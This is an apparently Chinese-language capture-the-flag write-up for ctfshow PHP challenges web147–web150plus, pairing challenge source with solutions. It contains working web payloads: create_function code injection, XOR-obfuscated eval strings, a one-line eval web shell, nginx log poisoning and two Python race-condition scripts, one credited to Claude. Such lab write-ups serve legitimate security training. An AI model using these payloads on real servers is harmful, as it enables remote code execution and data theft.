&lt;h1 id=&#34;web147&#34;&gt;&lt;a href=&#34;#web147&#34; class=&#34;headerlink&#34; title=&#34;web147&#34;&gt;&lt;/a&gt;web147&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-10-13 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-19 02:04:38

*/



highlight_file(__FILE__);

if(isset($_POST[&amp;#39;ctf&amp;#39;]))&amp;#123;
    $ctfshow = $_POST[&amp;#39;ctf&amp;#39;];
    if(!preg_match(&amp;#39;/^[a-z0-9_]*$/isD&amp;#39;,$ctfshow)) &amp;#123;
        $ctfshow(&amp;#39;&amp;#39;,$_GET[&amp;#39;show&amp;#39;]);
    &amp;#125;

&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;preg_match(&amp;#39;/^[a-z0-9_]*$/isD&amp;#39;,$ctfshow)&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;s&lt;/code&gt; → 点号可以匹配换行&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;D&lt;/code&gt; → &lt;code&gt;$&lt;/code&gt; 只匹配字符串末尾，不匹配换行前的位置。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;PHP 命名空间&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1.默认命名空间&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;在 PHP 中，如果没有声明 &lt;code&gt;namespace&lt;/code&gt;，所有函数、类和常量都属于 **全局命名空间 &lt;code&gt;\&lt;/code&gt;**。&lt;/li&gt;
&lt;li&gt;换句话说，PHP 原生函数（如 &lt;code&gt;system()&lt;/code&gt;, &lt;code&gt;strlen()&lt;/code&gt; 等）和标准类（如 &lt;code&gt;DateTime&lt;/code&gt;）都在 &lt;strong&gt;&lt;code&gt;\&lt;/code&gt; 命名空间&lt;/strong&gt; 下。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;2.函数调用方式：相对路径 vs 绝对路径&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;假设我们在某个命名空间里：&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;namespace MyApp;

system(&amp;quot;ls&amp;quot;);       // 相对路径调用
\system(&amp;quot;ls&amp;quot;);      // 绝对路径调用
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;相对路径调用&lt;/strong&gt; &lt;code&gt;system()&lt;/code&gt;：&lt;ul&gt;
&lt;li&gt;PHP 会先在当前命名空间查找 &lt;code&gt;MyApp\system()&lt;/code&gt; 函数，如果找不到再回退到全局命名空间 &lt;code&gt;\system()&lt;/code&gt;。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;绝对路径调用&lt;/strong&gt; &lt;code&gt;\system()&lt;/code&gt;：&lt;ul&gt;
&lt;li&gt;PHP 直接调用 &lt;strong&gt;全局命名空间&lt;/strong&gt; 下的原生函数或类，不经过当前命名空间查找。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;create_function()&lt;/code&gt;  函数（该函数自PHP7.2起已弃用，但可以 &lt;code&gt;eval&lt;/code&gt; 执行函数，只是需要把匿名部分闭合）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1.&lt;code&gt;create_function()&lt;/code&gt; 的作用&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;create_function()&lt;/code&gt; 是 PHP 中用来&lt;strong&gt;动态创建匿名函数&lt;/strong&gt;的函数。它允许你在运行时生成一个函数，并返回这个函数的名字（字符串形式），然后你可以通过这个名字调用函数。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;语法：&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;string create_function ( string $args , string $code )
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;$args&lt;/code&gt;：函数的参数列表（例如 &lt;code&gt;&amp;quot;\$x, \$y&amp;quot;&lt;/code&gt;）。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;$code&lt;/code&gt;：函数体的代码（不需要花括号 &lt;code&gt;&amp;#123;&amp;#125;&lt;/code&gt;，会自动加上 &lt;code&gt;return&lt;/code&gt; 时需要自己写）。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;返回值是生成函数的名字（类似 &lt;code&gt;&amp;quot;lambda_1&amp;quot;&lt;/code&gt;），你可以用这个名字调用函数。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2.示例&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;$func = create_function(&amp;#39;$a, $b&amp;#39;, &amp;#39;return $a + $b;&amp;#39;);
echo $func(2, 3); // 输出 5
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;解析：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;$a, $b&lt;/code&gt; 是函数参数。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;#39;return $a + $b;&amp;#39;&lt;/code&gt; 是函数体。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;$func&lt;/code&gt; 返回函数名字，调用 &lt;code&gt;$func(2,3)&lt;/code&gt; 就相当于调用匿名函数。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;#GET
?show=&amp;#125;system(&amp;quot;ls&amp;quot;);//

#POST
ctf=\create_function
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250817164152452.png&#34; alt=&#34;image-20250817164152452&#34; style=&#34;zoom:25%;&#34; /&gt;



&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;#GET
?show=&amp;#125;system(&amp;quot;tac flag.php&amp;quot;);//

#POST
ctf=\create_function
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250817164247599.png&#34; alt=&#34;image-20250817164247599&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web148&#34;&gt;&lt;a href=&#34;#web148&#34; class=&#34;headerlink&#34; title=&#34;web148&#34;&gt;&lt;/a&gt;web148&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-10-13 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-19 03:52:11

*/



include &amp;#39;flag.php&amp;#39;;
if(isset($_GET[&amp;#39;code&amp;#39;]))&amp;#123;
    $code=$_GET[&amp;#39;code&amp;#39;];
    if(preg_match(&amp;quot;/[A-Za-z0-9_\%\\|\~\&amp;#39;\,\.\:\@\&amp;amp;\*\+\- ]+/&amp;quot;,$code))&amp;#123;
        die(&amp;quot;error&amp;quot;);
    &amp;#125;
    @eval($code);
&amp;#125;
else&amp;#123;
    highlight_file(__FILE__);
&amp;#125;

function get_ctfshow_fl0g()&amp;#123;
    echo file_get_contents(&amp;quot;flag.php&amp;quot;);
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;正则过滤了 或 &lt;code&gt;|&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解一&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;使用 &lt;code&gt;rce_xor.py&lt;/code&gt; 异或脚本&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?code=(&amp;quot;%08%02%08%09%05%0d&amp;quot;^&amp;quot;%7b%7b%7b%7d%60%60&amp;quot;)(&amp;quot;%0c%08&amp;quot;^&amp;quot;%60%7b&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250817170143881.png&#34; alt=&#34;image-20250817170143881&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250817170047472.png&#34; alt=&#34;image-20250817170047472&#34; style=&#34;zoom:25%;&#34; /&gt;



&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?code=(&amp;quot;%08%02%08%09%05%0d&amp;quot;^&amp;quot;%7b%7b%7b%7d%60%60&amp;quot;)(&amp;quot;%09%01%03%01%06%0c%01%07%01%0b%08%0b&amp;quot;^&amp;quot;%7d%60%60%21%60%60%60%60%2f%7b%60%7b&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250817170440940.png&#34; alt=&#34;image-20250817170440940&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250817170605063.png&#34; alt=&#34;image-20250817170605063&#34; style=&#34;zoom:25%;&#34; /&gt;



&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解二&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;使用题目中的 &lt;code&gt;get_ctfshow_fl0g()&lt;/code&gt; 函数&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?code=(&amp;quot;%07%05%09%01%03%09%06%08%08%0f%08%01%06%0c%0b%07&amp;quot;^&amp;quot;%60%60%7d%5e%60%7d%60%7b%60%60%7f%5e%60%60%3b%60&amp;quot;)();
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250817223150980.png&#34; alt=&#34;image-20250817223150980&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250817223141523.png&#34; alt=&#34;image-20250817223141523&#34; style=&#34;zoom:25%;&#34; /&gt;



&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解三&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;已知 &lt;code&gt;&amp;quot;`&amp;#123;&amp;#123;&amp;#123;&amp;quot;^&amp;quot;?&amp;lt;&amp;gt;/&amp;quot;= _GET&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;尝试构造以下 payload&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;$_GET[a]($$_GET[b]);&amp;amp;a=system&amp;amp;b=tac flag.php&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;用中文变量代替英文变量&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?code=$简=&amp;quot;`&amp;#123;&amp;#123;&amp;#123;&amp;quot;^&amp;quot;?&amp;lt;&amp;gt;/&amp;quot;;$&amp;#123;$简&amp;#125;[单]($&amp;#123;$简&amp;#125;[爱]);&amp;amp;单=system&amp;amp;爱=tac flag.php
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250817230436469.png&#34; alt=&#34;image-20250817230436469&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web149&#34;&gt;&lt;a href=&#34;#web149&#34; class=&#34;headerlink&#34; title=&#34;web149&#34;&gt;&lt;/a&gt;web149&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-10-13 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-19 04:34:40

*/


error_reporting(0);
highlight_file(__FILE__);

$files = scandir(&amp;#39;./&amp;#39;); 
foreach($files as $file) &amp;#123;
    if(is_file($file))&amp;#123;
        if ($file !== &amp;quot;index.php&amp;quot;) &amp;#123;
            unlink($file);
        &amp;#125;
    &amp;#125;
&amp;#125;

file_put_contents($_GET[&amp;#39;ctf&amp;#39;], $_POST[&amp;#39;show&amp;#39;]);

$files = scandir(&amp;#39;./&amp;#39;); 
foreach($files as $file) &amp;#123;
    if(is_file($file))&amp;#123;
        if ($file !== &amp;quot;index.php&amp;quot;) &amp;#123;
            unlink($file);
        &amp;#125;
    &amp;#125;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解一&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;往 &lt;code&gt;index.php&lt;/code&gt; 内写一句话木马&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;#GET
?ctf=index.php

#POST
show=&amp;lt;?php @eval($_POST[a]);?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250817232809133.png&#34; alt=&#34;image-20250817232809133&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;/index.php

a=system(&amp;quot;ls /&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250817232331182.png&#34; alt=&#34;image-20250817232331182&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;/index.php

a=system(&amp;quot;tac /ctfshow_fl0g_here.txt&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250817232505739.png&#34; alt=&#34;image-20250817232505739&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解二&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;脚本解题&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;import io
import requests
import threading

url = &amp;#39;http://041fc7d0-f1df-4259-8289-b2fec0303711.challenge.ctf.show/&amp;#39;


def write():
    while event.isSet():
        data = &amp;#123;
            &amp;#39;show&amp;#39;: &amp;#39;&amp;lt;?php system(&amp;quot;cat /ctfshow_fl0g_here.txt&amp;quot;);?&amp;gt;&amp;#39;
        &amp;#125;
        requests.post(url=url+&amp;#39;?ctf=1.php&amp;#39;, data=data)


def read():
    while event.isSet():
        response = requests.get(url + &amp;#39;1.php&amp;#39;)
        if response.status_code != 404:
            print(response.text)
            event.clear()


if __name__ == &amp;quot;__main__&amp;quot;:
    event = threading.Event()
    event.set()
    for i in range(1, 100):
        threading.Thread(target=write).start()

    for i in range(1, 100):
        threading.Thread(target=read).start()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web150&#34;&gt;&lt;a href=&#34;#web150&#34; class=&#34;headerlink&#34; title=&#34;web150&#34;&gt;&lt;/a&gt;web150&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-10-13 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-19 07:12:57

*/
include(&amp;quot;flag.php&amp;quot;);
error_reporting(0);
highlight_file(__FILE__);

class CTFSHOW&amp;#123;
    private $username;
    private $password;
    private $vip;
    private $secret;

    function __construct()&amp;#123;
        $this-&amp;gt;vip = 0;
        $this-&amp;gt;secret = $flag;
    &amp;#125;

    function __destruct()&amp;#123;
        echo $this-&amp;gt;secret;
    &amp;#125;

    public function isVIP()&amp;#123;
        return $this-&amp;gt;vip?TRUE:FALSE;
        &amp;#125;
    &amp;#125;

    function __autoload($class)&amp;#123;
        if(isset($class))&amp;#123;
            $class();
    &amp;#125;
&amp;#125;

#过滤字符
$key = $_SERVER[&amp;#39;QUERY_STRING&amp;#39;];
if(preg_match(&amp;#39;/\_| |\[|\]|\?/&amp;#39;, $key))&amp;#123;
    die(&amp;quot;error&amp;quot;);
&amp;#125;
$ctf = $_POST[&amp;#39;ctf&amp;#39;];
extract($_GET);
if(class_exists($__CTFSHOW__))&amp;#123;
    echo &amp;quot;class is exists!&amp;quot;;
&amp;#125;

if($isVIP &amp;amp;&amp;amp; strrpos($ctf, &amp;quot;:&amp;quot;)===FALSE)&amp;#123;
    include($ctf);
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;===&lt;/code&gt; 优先级高于 &lt;code&gt;&amp;amp;&amp;amp;&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;__autoload()&lt;/code&gt; 函数&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1. 基本概念&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;__autoload&lt;/code&gt; 是 PHP 的一个 &lt;strong&gt;魔术函数&lt;/strong&gt;，用于 &lt;strong&gt;类自动加载&lt;/strong&gt;。它的作用是：当你实例化一个类，而 PHP 发现这个类还没有被定义时，会自动调用 &lt;code&gt;__autoload&lt;/code&gt;，由你在函数里定义如何加载对应类文件。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;函数签名：&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;function __autoload(string $className) &amp;#123;
    // 加载类文件逻辑
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;$className&lt;/code&gt;：PHP 试图实例化的类名。&lt;/li&gt;
&lt;li&gt;你在函数里通常会 include 或 require 该类对应的文件。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;2. 基本示例&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;假设有一个类 &lt;code&gt;User&lt;/code&gt;，存放在 &lt;code&gt;User.php&lt;/code&gt; 文件中：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;// User.php
class User &amp;#123;
    public function sayHi() &amp;#123;
        echo &amp;quot;Hi!&amp;quot;;
    &amp;#125;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;然后使用 &lt;code&gt;__autoload&lt;/code&gt; 自动加载：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php
function __autoload($className) &amp;#123;
    include $className . &amp;#39;.php&amp;#39;;
&amp;#125;

$user = new User();
$user-&amp;gt;sayHi();
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;流程说明：&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;PHP 遇到 &lt;code&gt;new User()&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;检查是否已经定义 &lt;code&gt;User&lt;/code&gt; 类。&lt;/li&gt;
&lt;li&gt;如果没有，自动调用 &lt;code&gt;__autoload(&amp;#39;User&amp;#39;)&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;__autoload&lt;/code&gt; 里 include &lt;code&gt;User.php&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;类被加载，然后实例化成功。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解一&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?isVIP=1

User-Agent
&amp;lt;?php @eval($_POST[a]);?&amp;gt;

ctf=/var/log/nginx/access.log&amp;amp;a=system(&amp;quot;ls&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250818003759234.png&#34; alt=&#34;image-20250818003759234&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?isVIP=1

User-Agent
&amp;lt;?php @eval($_POST[a]);?&amp;gt;

ctf=/var/log/nginx/access.log&amp;amp;a=system(&amp;quot;tac flag.php&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250818003930153.png&#34; alt=&#34;image-20250818003930153&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解二&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;使用竞争脚本&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;上传恶意 PHP 代码&lt;/strong&gt;：通过 &lt;code&gt;PHP_SESSION_UPLOAD_PROGRESS&lt;/code&gt; 伪造上传文件，把 &lt;code&gt;&amp;lt;?php eval($_POST[&amp;quot;cmd&amp;quot;]);?&amp;gt;&lt;/code&gt; 写入服务器的会话文件 &lt;code&gt;/tmp/sess_test&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;触发执行&lt;/strong&gt;：通过 &lt;code&gt;isVIP=1&lt;/code&gt; 的 POST 请求，把 &lt;code&gt;data[&amp;#39;cmd&amp;#39;]&lt;/code&gt; 内容（&lt;code&gt;system(&amp;quot;cat flag.php&amp;quot;)&lt;/code&gt;）发送到已经写入的 session 文件，从而执行 &lt;code&gt;cat flag.php&lt;/code&gt; 并读取 flag。&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250818011229912.png&#34; alt=&#34;image-20250818011229912&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&lt;strong&gt;竞争脚本 from Claude（可能需要多跑几次）&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;import io
import requests
import threading
import time
from concurrent.futures import ThreadPoolExecutor
import sys

class CTFExploit:
    def __init__(self):
        self.sessid = &amp;#39;test&amp;#39;
        self.base_url = &amp;#39;http://b962aff3-e9b9-4d5a-b650-4536947b6461.challenge.ctf.show/&amp;#39;
        self.data = &amp;#123;
            &amp;quot;ctf&amp;quot;: &amp;quot;/tmp/sess_test&amp;quot;,
            &amp;quot;cmd&amp;quot;: &amp;#39;system(&amp;quot;cat flag.php&amp;quot;);&amp;#39;
        &amp;#125;
        self.found_flag = False
        self.session = requests.Session()

    def write_session(self):
        &amp;quot;&amp;quot;&amp;quot;写入session文件&amp;quot;&amp;quot;&amp;quot;
        try:
            f = io.BytesIO(b&amp;#39;a&amp;#39; * 1024 * 30)  # 减少文件大小提高速度
            self.session.post(
                self.base_url,
                data=&amp;#123;&amp;#39;PHP_SESSION_UPLOAD_PROGRESS&amp;#39;: &amp;#39;&amp;lt;?php eval($_POST[&amp;quot;cmd&amp;quot;]);?&amp;gt;&amp;#39;&amp;#125;,
                files=&amp;#123;&amp;#39;file&amp;#39;: (&amp;#39;test.txt&amp;#39;, f)&amp;#125;, 
                cookies=&amp;#123;&amp;#39;PHPSESSID&amp;#39;: self.sessid&amp;#125;,
                timeout=5  # 添加超时
            )
        except:
            pass

    def read_flag(self):
        &amp;quot;&amp;quot;&amp;quot;尝试读取flag&amp;quot;&amp;quot;&amp;quot;
        try:
            res = self.session.post(
                f&amp;#39;&amp;#123;self.base_url&amp;#125;?isVIP=1&amp;#39;,
                data=self.data,
                timeout=5  # 添加超时
            )
            if &amp;#39;ctfshow&amp;#123;&amp;#39; in res.text:
                print(f&amp;quot;[+] Flag found: &amp;#123;res.text&amp;#125;&amp;quot;)
                self.found_flag = True
                return True
        except:
            pass
        return False

    def exploit(self):
        &amp;quot;&amp;quot;&amp;quot;主要攻击逻辑&amp;quot;&amp;quot;&amp;quot;
        print(&amp;quot;[*] Starting exploit...&amp;quot;)

        with ThreadPoolExecutor(max_workers=8) as executor:
            # 启动写入线程
            write_futures = []
            for _ in range(3):  # 减少写入线程数
                write_futures.append(executor.submit(self.continuous_write))

            # 启动读取线程
            read_futures = []
            for _ in range(5):  # 增加读取线程数，提高命中率
                read_futures.append(executor.submit(self.continuous_read))

            # 等待结果
            start_time = time.time()
            while not self.found_flag and (time.time() - start_time) &amp;lt; 30:  # 30秒超时
                time.sleep(0.1)

            if self.found_flag:
                print(&amp;quot;[+] Exploit successful!&amp;quot;)
            else:
                print(&amp;quot;[-] Exploit failed or timeout&amp;quot;)

            # 清理线程
            self.found_flag = True  # 停止所有线程

    def continuous_write(self):
        &amp;quot;&amp;quot;&amp;quot;持续写入session&amp;quot;&amp;quot;&amp;quot;
        while not self.found_flag:
            self.write_session()
            time.sleep(0.01)  # 短暂延迟避免过于频繁

    def continuous_read(self):
        &amp;quot;&amp;quot;&amp;quot;持续尝试读取&amp;quot;&amp;quot;&amp;quot;
        retry_count = 0
        while not self.found_flag and retry_count &amp;lt; 100:  # 限制重试次数
            if self.read_flag():
                break
            retry_count += 1
            if retry_count % 10 == 0:  # 每10次输出一次进度
                print(f&amp;#39;[*] Tried &amp;#123;retry_count&amp;#125; times...&amp;#39;)
            time.sleep(0.05)  # 增加读取间隔，减少无效请求

    def quick_exploit(self):
        &amp;quot;&amp;quot;&amp;quot;快速版本 - 更激进的并发策略&amp;quot;&amp;quot;&amp;quot;
        print(&amp;quot;[*] Starting quick exploit...&amp;quot;)

        # 预热 - 先写入几次session
        for _ in range(3):
            self.write_session()

        with ThreadPoolExecutor(max_workers=12) as executor:
            # 交替写入和读取
            futures = []
            for i in range(50):  # 限制总尝试次数
                if i % 3 == 0:  # 每3次读取前先写入一次
                    futures.append(executor.submit(self.write_session))
                futures.append(executor.submit(self.read_flag))

                if self.found_flag:
                    break

            # 等待部分完成即可
            for future in futures:
                if self.found_flag:
                    break
                try:
                    future.result(timeout=1)
                except:
                    continue

if __name__ == &amp;quot;__main__&amp;quot;:
    exploit = CTFExploit()

    # 尝试快速版本
    exploit.quick_exploit()

    # 如果快速版本失败，使用标准版本
    if not exploit.found_flag:
        print(&amp;quot;[*] Quick exploit failed, trying standard method...&amp;quot;)
        exploit.found_flag = False  # 重置标志
        exploit.exploit()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web150plus&#34;&gt;&lt;a href=&#34;#web150plus&#34; class=&#34;headerlink&#34; title=&#34;web150plus&#34;&gt;&lt;/a&gt;web150plus&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-10-13 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-19 07:12:57

*/
include(&amp;quot;flag.php&amp;quot;);
error_reporting(0);
highlight_file(__FILE__);

class CTFSHOW&amp;#123;
    private $username;
    private $password;
    private $vip;
    private $secret;

    function __construct()&amp;#123;
        $this-&amp;gt;vip = 0;
        $this-&amp;gt;secret = $flag;
    &amp;#125;

    function __destruct()&amp;#123;
        echo $this-&amp;gt;secret;
    &amp;#125;

    public function isVIP()&amp;#123;
        return $this-&amp;gt;vip?TRUE:FALSE;
        &amp;#125;
    &amp;#125;

    function __autoload($class)&amp;#123;
        if(isset($class))&amp;#123;
            $class();
    &amp;#125;
&amp;#125;

#过滤字符
$key = $_SERVER[&amp;#39;QUERY_STRING&amp;#39;];
if(preg_match(&amp;#39;/\_| |\[|\]|\?/&amp;#39;, $key))&amp;#123;
    die(&amp;quot;error&amp;quot;);
&amp;#125;
$ctf = $_POST[&amp;#39;ctf&amp;#39;];
extract($_GET);
if(class_exists($__CTFSHOW__))&amp;#123;
    echo &amp;quot;class is exists!&amp;quot;;
&amp;#125;

if($isVIP &amp;amp;&amp;amp; strrpos($ctf, &amp;quot;:&amp;quot;)===FALSE &amp;amp;&amp;amp; strrpos($ctf,&amp;quot;log&amp;quot;)===FALSE)&amp;#123;
    include($ctf);
&amp;#125;
